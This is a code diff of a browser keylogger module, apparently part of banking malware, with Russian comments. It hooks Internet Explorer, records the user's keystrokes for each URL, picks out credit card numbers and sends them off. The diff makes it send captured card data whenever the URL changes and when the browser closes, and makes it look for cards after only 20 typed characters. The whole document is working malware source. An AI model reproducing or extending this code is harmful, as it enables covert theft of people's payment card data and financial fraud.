@@ -30,6 +30,8 @@ struct UrlKeys
 UrlKeys* currData; //куда пишется поток клавиш
 PList listData; //список логгируемых урлов
 
+static void FlushLog();
+
 static UrlKeys* AddUrl( const char* url )
 {
 	UrlKeys* uk = (UrlKeys*)MemAlloc( sizeof(UrlKeys) );
@@ -45,7 +47,7 @@ static UrlKeys* AddUrl( const char* url )
 
 static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 {
-	TURL UR;
+	TURLREC UR;
 	if( ParseURL( (char*)Data, &UR, false ) )
 	{
 		//ищем новый урл в списке
@@ -67,6 +69,7 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	//если по какой-то причине урл не был найден или не был добавлен, то указываем по умолчанию неизвестный
 	if( currData == 0 )
 		currData = (UrlKeys*)List::GetItem( listData, 0 );
+	FlushLog(); //при смене урла отправляем все данные которые накопились
 	CCDBG( "CC", "логируем урл %s", currData->url );
 }
 
@@ -144,6 +147,18 @@ static void SendLog( UrlKeys* uk )
 	uk->posCard = -1;
 }
 
+//отправляет все что в логе, если есть номера карточек
+static void FlushLog()
+{
+	int count = List::Count(listData);
+	for( int i = 0; i < count; i++ )
+	{
+		UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
+		if( uk->posCard >= 0 )
+			SendLog(uk);
+	}
+}
+
 static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 {
 	char* keys = (char*)Data;
@@ -166,9 +181,9 @@ static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 		}
 		else //карточка еще не найдена
 		{
-			if( currData->endPos > 100 ) //начинаем определять карточку только после ввода 100 символов
+			if( currData->endPos > 20 ) //начинаем определять карточку только после ввода 20 символов
 			{
-				currData->posCard = FindCreditCard( currData->keys, currData->endPos, 0, currData->numCard, currData->posEndCard );
+				currData->posCard = FindCreditCard( currData->keys, currData->endPos + 1, 0, currData->numCard, currData->posEndCard );
 				if( currData->posCard >= 0 )
 				{
 					CCDBG( "CC", "определили карту %s", currData->numCard );
@@ -180,12 +195,19 @@ static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 }
 
 
+
+static void OnClose(LPVOID Sender)
+{
+	FlushLog(); //отправляем все данные которые накопились
+}
+
 bool Init(DWORD hashApp)
 {
 	PKeyLogSystem S = KeyLogger::AddSystem("CC", PROCESS_HASH_IE);
 	if( S != NULL )
 	{
 		S->TimeMode = KLG_TIME_INFINITE;
+		S->OnProcessClose = OnClose;
 		PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "*", "*", FILTRATE_ALL_WND, LOG_KEYBOARD, 5);
 		listData = List::Create();
 		//добавляем элемент где будут логгироваться клавиши когда урл неизвестен
